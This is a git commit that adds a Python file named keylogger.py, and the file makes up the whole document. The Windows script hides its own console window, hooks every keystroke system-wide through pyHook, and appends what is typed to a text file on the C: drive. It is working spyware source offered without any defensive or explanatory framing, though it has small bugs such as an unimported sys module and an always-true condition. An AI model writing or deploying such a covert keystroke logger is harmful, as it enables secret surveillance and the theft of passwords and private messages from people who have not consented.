8e477b72010c4298d2b6baa195fa4241334b15a4
Marquzes Ford Jr <111446691+markfordjr@users.noreply.github.com>
2024-08-21 14:54:32 -0400

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,30 @@
+import win32api
+import win32console
+import win32gui
+import pythoncom, pyHook
+
+win = win32console.GetConsoleWindow()
+win32gui.ShowWindow(win, 0)
+
+def OnKeyboardEvent(event):
+    if event.Ascii == 5:
+        sys.exit(1)
+    if event.Ascii != 0 or 8:
+        # open output.txt to read current keystrokes
+        f = open(r'c:\output.txt', 'r+')
+        buffer = f.read()
+        f.close()
+        # open output.txt to write current + new keystrokes
+        f = open(r'c:\output.txt', 'w')
+        keylogs = chr(event.Ascii)
+        if event.Ascii == 13:
+            keylogs = '\n'
+        buffer += keylogs
+        f.write(buffer)
+        f.close()
+
+# create a hook manager object
+hm = pyHook.HookManager()
+hm.KeyDown = OnKeyboardEvent
+hm.HookKeyboard()
+pythoncom.PumpMessages()
